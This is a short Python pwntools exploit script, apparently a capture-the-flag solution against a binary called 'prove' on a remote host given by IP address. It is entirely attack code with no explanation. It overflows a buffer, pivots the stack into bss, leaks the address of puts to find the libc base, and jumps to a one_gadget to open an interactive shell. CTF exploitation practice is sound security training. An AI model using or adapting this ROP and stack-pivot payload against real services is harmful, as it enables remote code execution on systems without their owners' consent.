from pwn import*
#p=process('./prove')
#p = remote('ctf2020.sfpwn.ml',4580)
p = remote('35.194.245.237',8085)
# gadget
bss = 0x601010+0x300
RLR = 0x4006B3
LR = 0x4006D3
puts_plt = 0x400530
puts_got = 0x600FD0
pop_rdi = 0x400743
pop_rsi_r15 = 0x400741

### exploit
# prev setting for ROP
pay = ''
pay += 'a'*0x30
pay += p64(bss+0x30)
pay += p64(RLR)  # ret
p.sendafter('>> ',pay)

# leak
pay = ''
pay += p64(bss+0x130)
pay += p64(pop_rdi)
pay += p64(puts_got)
pay += p64(puts_plt)
pay += p64(RLR)
pay += 'a'*(0x30-len(pay))
pay += p64(bss)
pay += p64(LR)
p.send(pay)

libc_puts = u64(p.recv(6).ljust(8,'\x00'))
libc_base = libc_puts - 0x6f690
log.info('libc_puts : {}'.format(hex(libc_puts)))
log.info('libc_base : {}'.format(hex(libc_base)))

# exploit
#one = [0x4f2c5,0x4f322,0x10a38c]
one = [0x45216,0x4526a,0xf02a4,0xf1147]
pay = ''
pay += 'X'*0x8
pay += p64(libc_base+one[0])
pay += 'b'*(0x30-len(pay))
pay += p64(bss+0x100)
pay += p64(LR)
p.send(pay)
p.interactive()

